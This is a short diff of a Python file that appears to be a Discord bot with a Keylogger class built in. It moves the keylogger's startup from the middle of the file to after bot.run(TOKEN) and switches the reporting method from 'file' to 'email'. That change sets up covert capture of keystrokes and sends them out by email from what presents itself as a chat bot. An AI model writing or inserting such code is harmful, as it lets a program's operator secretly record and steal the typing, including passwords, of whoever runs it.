@@ -112,9 +112,7 @@ class Keylogger:
         self.report()
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
-if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    keylogger.start()
+
 prescense=[
     "with your wife",
     "Grand Theft Auto IRL",
@@ -355,3 +353,6 @@ async def on_command_error(ctx, error):
         await ctx.send(embed=embedVar)
 
 bot.run(TOKEN)
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger.start()
